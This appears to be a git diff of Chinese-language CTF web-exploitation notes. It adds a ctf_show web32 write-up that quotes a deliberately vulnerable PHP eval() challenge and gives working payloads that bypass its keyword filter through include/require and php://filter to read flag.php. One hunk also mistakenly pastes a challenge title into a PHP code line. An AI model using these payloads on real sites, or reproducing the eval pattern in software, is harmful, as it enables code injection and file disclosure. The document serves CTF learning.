@@ -3355,7 +3355,7 @@ else{
 结果base64解码：
 
 ~~~php
-<?php
+GWCTF 2019]我有一个数据库<?php
 $id = $_GET['id'];
 $_SESSION['id'] = $id;
 
@@ -6209,3 +6209,54 @@ if (isset($_POST['guess'])) {
 ### [网鼎杯 2018]Comment
 
 宽字节注入
+
+
+
+### ctf_show web32 
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:56:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+} 
+
+~~~
+
+> 过滤了分号 
+>
+> eval函数还怎么执行呢？
+>
+> 
+
+**嵌套文件包含，利用伪协议文件包含，再base64解码**
+
+没有分号，最后一个语句可以使用`?>`来绕，没有空格可以用%0a来绕过
+
+payload:`?c=include%0a$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php`
+
+但是如果直接包含flag.php,发现啥都没有，因为flag.php包含进去了，但是并没有输出，所以要用伪协议再base64解码
+
+注意，如果include被过滤了，可以用require来代替
+
+    c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+
+
